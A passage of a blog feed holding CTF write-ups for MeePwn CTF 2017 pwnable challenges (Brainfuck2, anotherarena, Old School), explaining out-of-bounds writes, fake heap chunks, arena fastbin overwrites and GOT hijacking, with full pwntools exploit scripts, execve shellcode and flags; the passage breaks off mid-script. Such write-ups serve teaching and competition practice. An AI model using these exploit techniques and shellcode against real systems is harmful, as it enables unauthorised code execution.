shellcode</span></span><br><span class="line">    write(<span class="number">-0x10</span>, p64(<span class="number">0x400</span>))</span><br><span class="line">    <span class="comment"># change bf_data-&gt;dp = our shellcode buffer</span></span><br><span class="line">    write(<span class="number">-0x30</span>, p64(sc_base+<span class="number">0x800</span>))</span><br><span class="line">    <span class="comment"># write final shellcode to our shellcode buffer</span></span><br><span class="line">    write(<span class="number">0</span>, sc)</span><br><span class="line">    <span class="comment"># write to bf_data-&gt;sc_buf ( it will become a self-modified shellcode)</span></span><br><span class="line">    init_sc = asm(<span class="string">"mov rax, %s"</span> % hex(sc_base+<span class="number">0x800</span>))</span><br><span class="line">    init_sc += asm(<span class="string">"call rax"</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"init_sc"</span>, init_sc.encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"len:"</span>, len(init_sc)</span><br><span class="line">    write(<span class="number">-0x70d</span>, init_sc)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><p>flag: <code>MeePwnCTF{this_is_simple_challenge_:banana-dance:}</code></p><h2 id="Brainfuck2"><a href="#Brainfuck2" class="headerlink" title="Brainfuck2"></a>Brainfuck2</h2><p>For Brainfuck2, the binary is basically the same as Brainfuck1, except it has the following exectuting process:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">BrainFuckVM *__fastcall BrainFuckVM::run(BrainFuckVM *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *sc_buf; <span class="comment">// ST20_8@1</span></span><br><span class="line">    BrainFuckVM *v2; <span class="comment">// ST18_8@1</span></span><br><span class="line">    BrainFuckVM *result; <span class="comment">// rax@3</span></span><br><span class="line"></span><br><span class="line">    sc_buf = <span class="keyword">this</span>-&gt;sc_buf;</span><br><span class="line">    v2 = <span class="keyword">this</span>;</span><br><span class="line">    <span class="comment">/* allocate + memset bf_data-&gt;dp */</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;dp = (<span class="keyword">char</span> *)<span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="keyword">this</span>-&gt;dp, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="comment">/* set the sc_buf's permission to r-x*/</span></span><br><span class="line">    mprotect(v2-&gt;sc_buf, v2-&gt;sc_size, <span class="number">5</span>); </span><br><span class="line">    ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">char</span> *))sc_buf)(<span class="keyword">this</span>-&gt;bf_mem);</span><br><span class="line">    <span class="comment">/* set the sc_buf's permission back to rw-*/</span></span><br><span class="line">    mprotect(v2-&gt;sc_buf, v2-&gt;sc_size, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">this</span>-&gt;sc_pos = <span class="number">0L</span>L;</span><br><span class="line">    <span class="built_in">memset</span>(v2-&gt;sc_buf, <span class="number">0</span>, v2-&gt;sc_size);</span><br><span class="line">    <span class="comment">/* free bf_data-&gt;dp */</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">this</span>-&gt;dp )</span><br><span class="line">      <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(<span class="keyword">this</span>-&gt;dp)</span></span>;</span><br><span class="line">    result = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">this</span>-&gt;dp = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Several changes are made:</p><ol><li>We can hardly control the address of <code>bf_data-&gt;dp</code>, it will only be allocated before the execution of the machine code.</li><li>The <code>bf_data-&gt;sc_buf</code>‘s permission is changed to <code>r-x</code>, so this time the self-modified trick won’t work.</li></ol><p>Luckily, the vulnerability is still there – we can still use the OOB read/write to do some evil stuff ;)  </p><p>First of all, we can still use the OOB write to modify the <code>bf_data-&gt;dp</code> pointer, and because later the program will free this pointer, this means that <strong>we can control the address that is being freed</strong>. </p><p>After program free the <code>bf_data-&gt;dp</code> pointer, the first memory allocation will be the command line buffer, which chunk size is <code>0x110</code>. If we freed a buffer with address <code>addr</code> and size = 0x110, later when the program allocate a memory for the command line buffer, it will take <code>addr</code> as the new buffer, <strong>and so we can control the content of <code>addr</code></strong> by input our command ( the brainfuck code ).</p><p>Based on the above concept, I decided to do the following:</p><ol><li>Use OOB read to leak the heap address</li><li>Use OOB write to create fake chunk at <code>bf_data - some_offset</code></li><li>Use OOB write to overwrite <code>bf_data-&gt;dp</code>, making it point to our fake chunk</li></ol><p>By doing this, the program will eventually allocate <code>bf_data - some_offset</code> to the command line buffer, <strong>and thus making us able to control <code>bf_data</code> by input the next brainfuck code</strong>.</p><p>Since now we can control the structure of <code>bf_data</code>, all we need to do is to overwrite the <code>bf_data-&gt;sc_buf</code>, making it point to our shellcode buffer, so we can execute our own shellcode and capture the flag. Before we overwrite <code>bf_data-&gt;sc_buf</code>, there’re several things we’ll need to be aware of:</p><ol><li>We’ll have to write our shellcode in our shellcode buffer first. Since we can’t control <code>bf_data-&gt;dp</code>, I decided to use the <code>[&gt;.,]</code> brainfuck code to write my shellcode. The brainfuck code will keep reading our input until it encounters a null byte ( thanks to wikipedia ). Our shellcode will be placed on <code>bf_data-&gt;dp + some_offset</code>.</li><li>Notice the program will modify the first several bytes of our shellcode, so it’s better to pad some <code>NOP</code> at the beginning of our shellcode.</li><li>To avoid the program changing our shellcode into the <code>ret</code> instruction, we’ll have to overwrite the <code>bf_data-&gt;sc_pos</code> data as well ( because the program will place the <code>ret</code> machine code at <code>bf_data-&gt;sc_buf + bf_data-&gt;sc_pos</code> ). Overwrite this data to a large number, so the <code>ret</code> instruction won’t effect our shellcode.</li></ol><p>Final exploit script:<br><figure class="highlight python"><figcaption><span>exp_bf2.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"139.59.244.42"</span></span><br><span class="line">PORT = <span class="number">31338</span></span><br><span class="line">ELF_PATH = <span class="string">"./bf2"</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">'INFO'</span> <span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(s)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"&gt;&gt;"</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(move, content, scmd=None, scontent=None)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> move &lt; <span class="number">0</span>:</span><br><span class="line">        payload = <span class="string">"&lt;"</span> * abs(move)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">"&gt;"</span> * abs(move)</span><br><span class="line"></span><br><span class="line">    payload += <span class="string">",&gt;"</span>*len(content)</span><br><span class="line">    <span class="keyword">if</span> scmd:</span><br><span class="line">        payload += scmd</span><br><span class="line">        content += scontent</span><br><span class="line">    payload = payload.ljust(<span class="number">512</span>, <span class="string">"B"</span>)</span><br><span class="line">    </span><br><span class="line">    cmd(payload)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(move, cnt)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> move &lt; <span class="number">0</span>:</span><br><span class="line">        payload = <span class="string">"&lt;"</span> * abs(move)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">"&gt;"</span> * abs(move)</span><br><span class="line"></span><br><span class="line">    payload += <span class="string">".&gt;"</span>*cnt</span><br><span class="line">    payload = payload.ljust(<span class="number">512</span>, <span class="string">"B"</span>)</span><br><span class="line">    </span><br><span class="line">    cmd(payload)</span><br><span class="line">    r.recv(<span class="number">1024</span>) <span class="comment"># ¯\_(ツ)_/¯ </span></span><br><span class="line">    ret = r.recvuntil(<span class="string">"&gt;&gt;"</span>)[:<span class="number">-2</span>:]</span><br><span class="line">    r.unrecv(<span class="string">"&gt;&gt;"</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">sc = <span class="string">"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        r = process(ELF_PATH)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(HOST, PORT)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># make unsortbin + libc address</span></span><br><span class="line">    cmd(<span class="string">"A"</span>*<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    libc.address = u64(leak(<span class="number">0x110</span>, <span class="number">8</span>)) - <span class="number">0x3c3b78</span> <span class="comment"># local</span></span><br><span class="line">    log.success(<span class="string">"libc base: "</span>+hex(libc.address))</span><br><span class="line">    heap_addr = u64(leak(<span class="number">-0x30</span>, <span class="number">8</span>))</span><br><span class="line">    log.success(<span class="string">"heap_addr: "</span>+hex(heap_addr))</span><br><span class="line">    fake_chunk = heap_addr - <span class="number">0x70</span></span><br><span class="line">    log.success(<span class="string">"fake_chunk: "</span>+hex(fake_chunk))</span><br><span class="line">    sc_buf = heap_addr + <span class="number">0x3b0</span><span class="comment"># our shellcode buffer</span></span><br><span class="line">    log.success(<span class="string">"sc_buf: "</span>+hex(sc_buf))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake chunk</span></span><br><span class="line">    write(<span class="number">-0x78</span>, p64(<span class="number">0x111</span>) )</span><br><span class="line">    special = <span class="string">"&lt;"</span>*<span class="number">0xd0</span> + <span class="string">",&gt;"</span>*<span class="number">8</span></span><br><span class="line">    <span class="comment"># fake next size</span></span><br><span class="line">    write(<span class="number">0x98</span>, p64(<span class="number">0x71</span>),special, p64(fake_chunk))</span><br><span class="line">    <span class="comment"># create gets-like function, puts shellcode @ 0xXXXXX000 ( our shellcode buffer)</span></span><br><span class="line">    cmd(<span class="string">",[&gt;.,]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,[&gt;.,]"</span>)</span><br><span class="line">    payload = <span class="string">"i"</span>*<span class="number">0x108</span> + <span class="string">"\xa1\x01\x02\x00"</span> <span class="comment"># fake next size</span></span><br><span class="line">    payload += <span class="string">"i"</span>*<span class="number">0x190</span></span><br><span class="line">    payload += <span class="string">"\x90"</span>*<span class="number">0x10</span> + sc + <span class="string">"\x00"</span></span><br><span class="line">    r.send(payload)</span><br><span class="line">    <span class="comment"># overwrite bf_data, make bf_data-&gt;sc_buf point to our shellcode buffer</span></span><br><span class="line">    payload = <span class="string">"i"</span>*<span class="number">0x40</span></span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(sc_buf) + p64(<span class="number">0x100</span>) + p64(<span class="number">100</span>) + p64(<span class="number">0x1000</span>) + p64(<span class="number">0x111</span>)</span><br><span class="line">    cmd(payload)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure></p><p>flag: <code>MeePwnCTF{My_M33pwn_h34p_1s_fun?}</code></p><p>Got both first blood on these challenges ! WOOHOO ! 😎🤘</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Pwnable&lt;/p&gt;
&lt;p&gt;Both binaries are 64 bit ELF, No RELRO, No canary, PIE &amp;amp; NX enabled.  &lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="heap" scheme="https://bruce30262.github.io/tags/heap/"/>
    
      <category term="shellcode" scheme="https://bruce30262.github.io/tags/shellcode/"/>
    
      <category term="MeePwn" scheme="https://bruce30262.github.io/tags/MeePwn/"/>
    
      <category term="brainfuck" scheme="https://bruce30262.github.io/tags/brainfuck/"/>
    
  </entry>
  
  <entry>
    <title>MeePwn CTF 2017 -- anotherarena</title>
    <link href="https://bruce30262.github.io/2017/07/16/MeePwn-CTF-2017-anotherarena/"/>
    <id>https://bruce30262.github.io/2017/07/16/MeePwn-CTF-2017-anotherarena/</id>
    <published>2017-07-16T03:00:00.000Z</published>
    <updated>2018-01-03T15:08:05.611Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> Pwnable</p><p>64 bit ELF, Partial RELRO, canary &amp; NX enabled, No PIE.  </p><a id="more"></a><p>The program is a simple crackme program with multi-thread. First, the program will read the FLAG into a global buffer <code>flag</code> . Then, it will ask us to input the size of a buffer. Later the program will use a thread to malloc a buffer <code>buf</code> with the given size. Then the program will use another thread to do the following:  </p><ul><li>Ask for a 4 byte data and treat it as <code>index</code></li><li>Ask for a 4 byte data, and store it at <code>buf[index]</code></li><li>Repeat</li></ul><p>It will repeat <code>given_size / 4</code> times. If the input <code>index</code> is larger than the given size, it will also break out the loop. Basically it just letting us input a bunch of integers to the <code>buf</code> buffer.  </p><p>After that the program will do the following:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* add all integers in buf to v5*/</span></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; LODWORD(g_size[<span class="number">0</span>]); i += <span class="number">4</span> )</span><br><span class="line">    v5 += *(<span class="keyword">int</span> *)((<span class="keyword">char</span> *)g_heap_buf + (<span class="keyword">signed</span> <span class="keyword">int</span>)i);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* read size and allocate a buffer ( for license) */</span></span><br><span class="line">size = read_int();</span><br><span class="line">lic = <span class="built_in">malloc</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line"><span class="comment">/* read to lic */</span></span><br><span class="line">read(<span class="number">0</span>, lic, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)size);</span><br><span class="line"><span class="comment">/* crackme check*/</span></span><br><span class="line"><span class="keyword">if</span> ( v5 == <span class="number">3233853430</span> )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Good boy! Your license: %s\n"</span>, lic);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Bad b0y!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p>So, to solve this challenge, we’ll have to:</p><ul><li>Pass the crackme check ( this is easy )</li><li><strong>Locate the <code>lic</code> buffer at ( or near ) the <code>flag</code> buffer</strong>, so later we can leak the flag by print out the license content. We’ll focus on this one.</li></ul><p>First of all the program has a out-of-bound write vulnerability: by input a <strong>negative</strong> <code>index</code>, we can overwrite the data at <code>buf[-XXX]</code>.  </p><p>Before we use this vulnerability to exploit the service, we’ll have to understand how the malloc work in different thread. When a thread wants to malloc a buffer, it will use its own <code>arena</code> structure, a data structure which stores the malloc state of that thread ( check out the <a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#1648" target="_blank" rel="noopener">source code</a> ). The <code>arena</code> structure will also store the fastbin chunks’ address ( the <code>fastbinsY[NFASTBINS]</code> member ). </p><p>If we can control <code>fastbinsY[NFASTBINS]</code>, we’ll be able to malloc a fastbin chunk at any address ( theoretically, since we’ll still need to bypass some check in malloc ). By using gdb, we can locate the thread <code>arena</code>‘s address is at <code>buf - 0x8a0</code>, making us able to use the OOB write to overwrite its data structure.</p><p>Now we’ll have to choose our fake chunk’s location. I decided to choose the address <code>0x6020bd</code>: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/2gx 0x6020bd</span><br><span class="line">0x6020bd:       0xfff7bb5540000000      0x000000000000007f   &lt;-- fake fastbin chunk ( size = 0x70 )</span><br></pre></td></tr></table></figure><p>We can see that <code>0x6020bd</code> is a good target of a fake fastbin[5] chunk ( size = 0x70 ). The <code>0x7f</code> is a part of the <code>stderr</code> address. Moreover, the <code>flag</code> is at <code>0x602101</code> ( behind the fake chunk ) , so we can just pad some chars to the allocated chunk ( pad until it reach the beginning of the flag buffer ), later when the program print out the license content, it will give us the flag as well.  </p><p>So to sum up:</p><ol><li>Use the OOB write to overwrite <code>fastbinsY[5]</code></li><li>Choose the fake fastbin[5] chunk target at <code>0x6020bd</code></li><li>Input the data to bypass the crackme check</li><li>Input allocate size to make <code>malloc()</code> allocate fastbin[5] ( size = 0x70 )</li><li>Pad the allocated buffer until it reach the <code>flag</code> buffer</li><li>Print out the license and get the flag</li></ol><figure class="highlight python"><figcaption><span>exp_arena.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"139.59.241.76"</span></span><br><span class="line">PORT = <span class="number">31335</span></span><br><span class="line">ELF_PATH = <span class="string">"./anotherarena_noalarm"</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">'INFO'</span> <span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0x602101</span></span><br><span class="line">fake_chunk = <span class="number">0x6020bd</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(off, data)</span>:</span></span><br><span class="line">    r.send(p32(off))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    r.send(p32(data))</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">"50"</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="comment"># move the offset to thread's arena + 0x30 ( fastbin[5], size=0x70 )</span></span><br><span class="line">    <span class="comment"># fake chunk near stderr, use its 0x7f to create fake chunk</span></span><br><span class="line">    write(<span class="number">0xfffff790</span>, fake_chunk)</span><br><span class="line">    <span class="comment"># make final answer = 3233853430</span></span><br><span class="line">    write(<span class="number">0</span>, <span class="number">0x7fffffff</span>)</span><br><span class="line">    write(<span class="number">4</span>, <span class="number">0x40c0af8f</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># break loop</span></span><br><span class="line">    r.send(p32(<span class="number">100</span>)) </span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># allocate buf &amp; pad to flag</span></span><br><span class="line">    r.sendline(<span class="string">"104"</span>) <span class="comment"># allocate 104 byte</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    r.send(<span class="string">"i"</span>*<span class="number">0x34</span>) <span class="comment"># pad to flag</span></span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><p>flag: <code>MeePwnCTF{oveRwrit3_another_(main)_arena}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Pwnable&lt;/p&gt;
&lt;p&gt;64 bit ELF, Partial RELRO, canary &amp;amp; NX enabled, No PIE.  &lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="heap" scheme="https://bruce30262.github.io/tags/heap/"/>
    
      <category term="MeePwn" scheme="https://bruce30262.github.io/tags/MeePwn/"/>
    
  </entry>
  
  <entry>
    <title>MeePwn CTF 2017 -- Old School</title>
    <link href="https://bruce30262.github.io/2017/07/16/MeePwn-CTF-2017-Old-School/"/>
    <id>https://bruce30262.github.io/2017/07/16/MeePwn-CTF-2017-Old-School/</id>
    <published>2017-07-16T01:56:00.000Z</published>
    <updated>2018-01-03T15:08:05.611Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> Pwnable</p><p>64 bit ELF, Partial RELRO, NX enabled, No PIE, has canary.  </p><a id="more"></a>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-------- BookStore --------</span><br><span class="line">1.       Add Book.</span><br><span class="line">2.       Edit Book.</span><br><span class="line">3.       Delete Book.</span><br><span class="line">4.       Show Books.</span><br><span class="line">5.       Exit.</span><br></pre></td></tr></table></figure><p>As we can see we can add, edit, delete or show a book. Books are stored in a pointer array <code>books</code>, each pointer point to a <code>book</code> data structure:  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> book_name[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">char</span> author[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">int</span> desc_len;</span><br><span class="line">    <span class="keyword">char</span> desc[<span class="number">256</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <code>books</code> array and each <code>book</code> pointer are all placed on the stack memory.  </p><p>The program did not initialize the <code>book</code> variable before setting its data. Since there’s a libc address ( <code>&lt;atoi + 0x10&gt;</code> ) in it, we can leak the libc address by entering 4 characters in the description:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Choice:4</span><br><span class="line">------------ 1 ------------</span><br><span class="line">Name: 11111111</span><br><span class="line">Author: 11111111</span><br><span class="line">Description: AAAA�N���</span><br><span class="line">-------- BookStore --------</span><br><span class="line">1.       Add Book.</span><br><span class="line">2.       Edit Book.</span><br><span class="line">3.       Delete Book.</span><br><span class="line">4.       Show Books.</span><br><span class="line">5.       Exit.</span><br></pre></td></tr></table></figure></p><p>After done some fuzzing, I also found that if we input 32 characters in <code>book_name</code> and <code>author</code> ( no newline ) , the <code>desc_len</code> will be overwritten with our input, and become a large integer. Since when we edit the book description, the length to read is depend on the <code>desc_len</code> data, this make us able to overflow the <code>book-&gt;description</code> buffer and overwrite the pointers in the <code>books</code> array !  </p><p>So here’s how I exploit the service:</p><ol><li>First leak the libc address</li><li>Overwrite the <code>desc_len</code> data</li><li>Overflow the <code>books[0]-&gt;desc</code> buffer and overwrite <code>books[0]</code>, let it point to the GOT section</li><li>Edit <code>books[0]</code> and do the GOT hijacking ( hijack atoi to system )</li></ol><p>The exploit at the local side worked, but for some unknown reason, the service at the remote side has a different behavior: during the last step of the exploitation, it won’t let us input the <code>author</code> data, thus failing our exploit. Although we can still pwn it by not entering the author’s name, it still took me a while to debug the whole process.  </p><figure class="highlight python"><figcaption><span>exp_oldschool.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 